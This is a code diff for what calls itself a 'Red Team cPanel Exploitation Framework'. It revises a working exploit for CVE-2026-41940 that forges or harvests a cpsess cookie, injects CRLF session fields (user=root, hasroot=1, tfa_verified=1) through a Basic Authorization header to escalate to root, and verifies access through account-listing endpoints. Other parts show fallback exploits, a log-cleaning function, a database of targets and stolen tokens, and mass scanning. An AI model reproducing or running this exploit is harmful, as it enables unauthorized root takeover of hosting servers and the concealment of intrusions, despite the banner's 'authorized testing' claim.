@@ -100,7 +100,6 @@ def print_banner():
             RED + " | |    | |__| | |  | |\  |_| |_ " + RESET,
             RED + " |_|     \____/|_|  |_| \_|_____|" + RESET,
         ]
-    # Separator lines – reduced for smaller terminals
     lines.append(YELLOW + "=" * 70 + RESET)
     lines.append(GREEN + "  Red Team cPanel Exploitation Framework v3.0" + RESET)
     lines.append(RED + "  FOR AUTHORIZED TESTING ONLY!" + RESET)
@@ -279,7 +278,7 @@ def get_major_version(version):
     return 0
 
 # ----------------------------------------------------------------------
-# Exploits (with exception handling)
+# CVE-2026-41940 Exploit (improved)
 # ----------------------------------------------------------------------
 def exploit_cve_2026_41940(host, port):
     try:
@@ -287,74 +286,67 @@ def exploit_cve_2026_41940(host, port):
         base = f"{scheme}://{host}:{port}"
         session = get_session()
 
+        # Check version – skip if patched
         version = get_cpanel_version(host, port)
         if get_major_version(version) > 120:
             return {"status": "CVE_Version_Patched", "token": None}
 
-        resp1 = request_with_retry("GET", f"{base}/cpanel/", session=session)
-        if not resp1 or resp1.status_code not in [200, 302]:
-            return {"status": "CVE_Stage1_Failed", "token": None}
-
+        # Stage 1: Obtain a session cookie
         cookie_name = None
-        for cookie in session.cookies:
-            if re.search(r'cpsess', cookie.name, re.I) or re.match(r'^[0-9a-f]{32}$', cookie.name):
-                cookie_name = cookie.name
-                break
-        if not cookie_name:
-            if "Set-Cookie" in resp1.headers:
-                set_cookie = resp1.headers["Set-Cookie"]
+        # Try multiple endpoints to get a cookie
+        endpoints = ["/", "/cpanel/", "/cpanel"]
+        for path in endpoints:
+            resp = request_with_retry("GET", f"{base}{path}", session=session)
+            if not resp:
+                continue
+            # Check Set-Cookie header
+            if "Set-Cookie" in resp.headers:
+                set_cookie = resp.headers["Set-Cookie"]
                 match = re.search(r'(cpsess[0-9a-f]+)=', set_cookie, re.I)
                 if match:
                     cookie_name = match.group(1)
-        if not cookie_name:
-            return {"status": "CVE_No_Cookie", "token": None}
-
-        poison_payload_bytes = b'root:somepass\r\nuser=root\r\nhasroot=1\r\ntfa_verified=1\r\nsuccessful_internal_auth_with_timestamp=9999999999'
-        poison_payload = "root:somepass\r\nuser=root\r\nhasroot=1\r\ntfa_verified=1\r\nsuccessful_internal_auth_with_timestamp=9999999999"
-
-        poison_payloads = [
-            ("Authorization", "Basic " + base64.b64encode(poison_payload_bytes).decode()),
-            ("User-Agent", poison_payload),
-            ("X-Forwarded-For", "127.0.0.1\r\nuser=root\r\nhasroot=1"),
-            ("Referer", f"{base}/\r\nuser=root\r\nhasroot=1")
-        ]
-
-        success = False
-        for header, value in poison_payloads:
-            headers = {header: value}
-            time.sleep(random.uniform(0.5, 2.0))
-            resp2 = request_with_retry("GET", f"{base}/cpanel/", session=session, headers=headers)
-            if resp2:
-                new_cookie = session.cookies.get(cookie_name)
-                if new_cookie and new_cookie != session.cookies.get(cookie_name):
-                    success = True
                     break
-        if not success:
-            auth_b64 = base64.b64encode(poison_payload_bytes).decode()
-            headers = {"Authorization": f"Basic {auth_b64}"}
-            resp2 = request_with_retry("GET", f"{base}/cpanel/", session=session, headers=headers)
-            if not resp2:
-                return {"status": "CVE_Stage2_Failed", "token": None}
-
-        reload_endpoints = [
-            f"{base}/json-api/version",
-            f"{base}/cpanel/",
-            f"{base}/json-api/listaccts"
-        ]
-        reload_success = False
-        for endpoint in reload_endpoints:
-            time.sleep(random.uniform(0.3, 1.0))
-            resp3 = request_with_retry("GET", endpoint, session=session)
-            if resp3 and resp3.status_code == 200:
-                reload_success = True
+            # Also check session.cookies
+            for cookie in session.cookies:
+                if re.search(r'cpsess', cookie.name, re.I) or re.match(r'^[0-9a-f]{32}$', cookie.name):
+                    cookie_name = cookie.name
+                    break
+            if cookie_name:
                 break
-        if not reload_success:
+
+        # If still no cookie, generate a dummy one (some versions accept any cpsess value)
+        if not cookie_name:
+            cookie_name = "cpsess" + ''.join(random.choices('0123456789abcdef', k=16))
+            # Set it manually in the session so it persists
+            session.cookies.set(cookie_name, "dummy")
+            logger.info(f"Generated dummy cookie name: {cookie_name}")
+
+        # Stage 2: Poison the session via Authorization header
+        poison_payload = (
+            "root:somepass\r\n"
+            "user=root\r\n"
+            "hasroot=1\r\n"
+            "tfa_verified=1\r\n"
+            "successful_internal_auth_with_timestamp=9999999999"
+        )
+        auth_b64 = base64.b64encode(poison_payload.encode()).decode()
+        headers = {"Authorization": f"Basic {auth_b64}"}
+        resp2 = request_with_retry("GET", f"{base}/cpanel/", session=session, headers=headers)
+        if not resp2:
+            return {"status": "CVE_Stage2_Failed", "token": None}
+
+        # Stage 3: Force session reload – request /cpanel/ again (without poison)
+        # This forces the server to read the poisoned session file
+        resp3 = request_with_retry("GET", f"{base}/cpanel/", session=session)
+        if not resp3:
             return {"status": "CVE_Stage3_Failed", "token": None}
 
+        # Stage 4: Verify root access – try to list accounts
         token_value = session.cookies.get(cookie_name)
         if not token_value:
             return {"status": "CVE_Verify_Failed", "token": None}
 
+        # Try to access a restricted endpoint
         verify_url = f"{base}/json-api/listaccts"
         resp4 = request_with_retry("GET", verify_url, session=session)
         if resp4 and resp4.status_code == 200:
@@ -372,6 +364,7 @@ def exploit_cve_2026_41940(host, port):
             except:
                 pass
 
+        # If listaccts fails, try version endpoint (which might now be accessible)
         resp5 = request_with_retry("GET", f"{base}/json-api/version", session=session)
         if resp5 and resp5.status_code == 200:
             try:
@@ -392,6 +385,9 @@ def exploit_cve_2026_41940(host, port):
         logger.error(f"CVE exploit crashed on {host}:{port}: {e}")
         return {"status": "CVE_Exception", "token": None}
 
+# ----------------------------------------------------------------------
+# Other exploits (GraphQL, Legacy) – unchanged but kept for fallback
+# ----------------------------------------------------------------------
 def exploit_graphql(host, port):
     try:
         scheme = "https" if port not in [2082, 2095] else "http"
@@ -498,7 +494,7 @@ def exploit_cpanel(host, port):
             result["method"] = name
             return result
         if result and result.get("token"):
-            # If we got a token but not fully exploited, we could still use it later
+            # We got a token but not fully exploited – could still be useful
             pass
     return result or {"status": "All_Methods_Failed", "token": None}
 
@@ -601,7 +597,7 @@ def clean_logs(host, port, cookie_name, token):
     return False
 
 # ----------------------------------------------------------------------
-# Database (with UNIQUE constraint)
+# Database
 # ----------------------------------------------------------------------
 class Database:
     def __init__(self, db_path="targets.db"):
@@ -630,7 +626,6 @@ class Database:
                 UNIQUE(host, port)
             )
         ''')
-        # Add missing columns if they don't exist (for upgrades)
         for col in ['token', 'cookie_name', 'version', 'last_exploit_attempt']:
             try:
                 self.cursor.execute(f"ALTER TABLE targets ADD COLUMN {col} TEXT")
@@ -1035,7 +1030,6 @@ class CPwn3rApp:
             return
         targets = [f"{host}:{port}" if port else host for _, host, port in pending]
         alive = scan_targets(targets, self.scan_threads)
-        # Update database with results
         alive_hosts = set()
         for host, port in alive:
             alive_hosts.add((host, port))
@@ -1044,7 +1038,6 @@ class CPwn3rApp:
                     self.db.update_port(tid, port)
                     self.db.update_scan(tid, "Open", port)
                     break
-        # Mark non‑alive as Closed
         for tid, host, port in pending:
             if (host, port) not in alive_hosts and (host, None) not in alive_hosts:
                 self.db.update_scan(tid, "Closed")
